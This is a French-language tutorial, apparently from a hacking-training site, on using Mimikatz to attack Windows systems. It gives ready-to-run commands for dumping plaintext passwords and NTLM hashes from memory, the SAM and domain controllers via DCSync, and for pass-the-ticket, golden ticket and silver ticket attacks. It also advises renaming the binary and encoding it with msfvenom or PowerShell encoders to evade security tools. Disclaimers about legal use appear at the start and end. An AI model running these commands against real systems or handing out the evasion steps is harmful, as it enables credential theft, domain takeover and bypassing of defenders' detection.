# Mimikatz

## Mimikatz - Guide Complet pour l'Extraction de Mots de Passe et de Tickets Kerberos

***

### Introduction

**Mimikatz** est un outil open-source développé pour l'analyse et le test de la sécurité des systèmes Windows. Il est largement utilisé dans les tests de pénétration pour :

* **Extraire des mots de passe en clair, des hashes et des clés** à partir de la mémoire.
* **Intercepter et manipuler des tickets Kerberos** pour des attaques avancées comme le Pass-the-Ticket ou le Golden Ticket.
* **Vérifier les failles de configuration** dans la gestion des mots de passe et des sessions.

⚠️ **Avertissement** : Mimikatz est un outil extrêmement puissant. Son utilisation doit se faire uniquement dans un cadre légal avec l'autorisation des administrateurs du système cible.

***

### 🚀 Étape 1 : Installation de Mimikatz

***

#### Installation sous Windows

1. **Téléchargez Mimikatz** :
   * Depuis le dépôt GitHub officiel : [https://github.com/gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz)
2. **Décompressez l'archive** :
   * Extrayez le contenu de l'archive ZIP dans un répertoire.
3. **Lancez une invite de commandes avec les droits administratifs** :
   * Cherchez **cmd** dans le menu Démarrer, faites un clic droit et sélectionnez **Exécuter en tant qu'administrateur**.
4. **Exécutez Mimikatz** :
   *   Accédez au répertoire où se trouve `mimikatz.exe` et lancez-le :

       ```cmd
       mimikatz.exe
       ```

***

### 🛠️ Étape 2 : Commandes de Base

***

#### 1. Démarrer Mimikatz

*   **Commande** :

    ```cmd
    mimikatz
    ```
* **Explication** :
  * Lance l’interface de commande interactive de Mimikatz.

***

#### 2. Obtenir les Privilèges Nécessaires

*   **Commande** :

    ```cmd
    privilege::debug
    ```
* **Explication** :
  * Active les privilèges de débogage, nécessaires pour accéder à des données sensibles comme les hashes ou les mots de passe en mémoire.

***

#### 3. Extraire les Hashes NTLM

*   **Commande** :

    ```cmd
    lsadump::sam
    ```
* **Explication** :
  * Extrait les hashes des mots de passe des comptes stockés dans le **SAM (Security Accounts Manager)**.

> 💡 **Astuce** : Si vous utilisez un contrôleur de domaine, les comptes seront extraits depuis le fichier `NTDS.dit`.

***

#### 4. Extraire les Mots de Passe des Sessions Actives

*   **Commande** :

    ```cmd
    sekurlsa::logonpasswords
    ```
* **Explication** :
  * Liste les sessions utilisateur actives et affiche les mots de passe (en clair, si disponibles) ou leurs hashes.

***

### 🎯 Étape 3 : Gestion des Tickets Kerberos

***

#### 1. Liste des Tickets Kerberos en Mémoire

*   **Commande** :

    ```cmd
    kerberos::list
    ```
* **Explication** :
  * Affiche tous les tickets Kerberos en mémoire, y compris les TGT (Ticket-Granting Tickets) et les TGS (Ticket-Granting Service).

***

#### 2. Injecter un Ticket Kerberos

*   **Commande** :

    ```cmd
    kerberos::ptt /path/to/ticket.kirbi
    ```
* **Explication** :
  * Injecte un ticket `.kirbi` dans le système pour accéder à des ressources sans authentification supplémentaire (Pass-the-Ticket).

***

#### 3. Créer un Golden Ticket

*   **Commande** :

    ```cmd
    kerberos::golden /domain:<domain_name> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /user:<username>
    ```
* **Explication** :
  * Génère un **Golden Ticket** pour obtenir un accès persistant à un domaine Windows.
  * Requiert :
    * Le nom de domaine (`<domain_name>`).
    * L'identifiant SID du domaine (`<domain_sid>`).
    * Le hash NTLM du compte KRBTGT (`<krbtgt_hash>`).

***

### 📋 Étape 4 : Exemples de Scénarios

***

#### 1. Extraction des Hashes NTLM du SAM

*   **Commande complète** :

    ```cmd
    privilege::debug
    lsadump::sam
    ```
* **Explication** :
  * Active les privilèges nécessaires et extrait les hashes NTLM des utilisateurs stockés localement.

***

#### 2. Extraction des Hashes du Contrôleur de Domaine

*   **Commande complète** :

    ```cmd
    privilege::debug
    lsadump::dcsync /domain:<domain_name> /user:<username>
    ```
* **Explication** :
  * Utilise la fonction DCSync pour simuler un contrôleur de domaine et obtenir les informations d'authentification des comptes.
  * `<domain_name>` : Nom du domaine cible.
  * `<username>` : Nom d’un compte utilisateur (ex. : `administrator`).

***

#### 3. Pass-the-Ticket avec un Ticket Kerberos

*   **Commande complète** :

    ```cmd
    kerberos::ptt ticket.kirbi
    ```
* **Explication** :
  * Injecte un ticket Kerberos récupéré précédemment pour accéder aux ressources du domaine cible.

***

#### 4. Attaque Silver Ticket

*   **Commande complète** :

    ```cmd
    kerberos::golden /domain:<domain_name> /sid:<domain_sid> /target:<target_service> /service:<service_name> /rc4:<service_account_hash>
    ```
* **Explication** :
  * Crée un ticket spécifique pour un service particulier (ex. : `CIFS` ou `HTTP`) en utilisant le hash NTLM du compte de service.

***

### 🔍 Étape 5 : Techniques Avancées

***

#### 1. Utiliser Mimikatz en Mode Non Interactif

*   **Commande** :

    ```cmd
    mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
    ```
* **Explication** :
  * Exécute des commandes prédéfinies dans un script unique et quitte automatiquement.

***

#### 2. Anonymiser l'Exécution de Mimikatz

* **Astuce** :
  * Renommez l'exécutable en un nom aléatoire pour éviter la détection par les outils de sécurité.

***

#### 3. Encoder Mimikatz pour Éviter la Détection

* Combinez Mimikatz avec des outils comme **Msfvenom** ou des encodeurs PowerShell pour contourner les solutions de détection.

***

### 📖 Bonnes Pratiques

1. **Obtenez des autorisations légales** :
   * L'utilisation de Mimikatz sans autorisation est illégale.
2. **Utilisez un environnement isolé** :
   * Testez Mimikatz dans des machines virtuelles ou des environnements de laboratoire.
3. **Mettez à jour les systèmes cibles** :
   * De nombreuses techniques de Mimikatz exploitent des vulnérabilités corrigées dans les mises à jour Windows récentes.
4. **Analysez les journaux d'événements** :
   * Activez et surveillez les journaux pour détecter toute activité suspecte liée à l'outil.

***

**Liens utiles :**

* [Mentions légales](https://dika-1.gitbook.io/road-to-hacker/mentions-legales)
* [Politique de confidentialité](https://dika-1.gitbook.io/road-to-hacker/politique-de-confidentialite)
* [Contactez-nous](mailto:dika-road-to-hacker@protonmail.com)
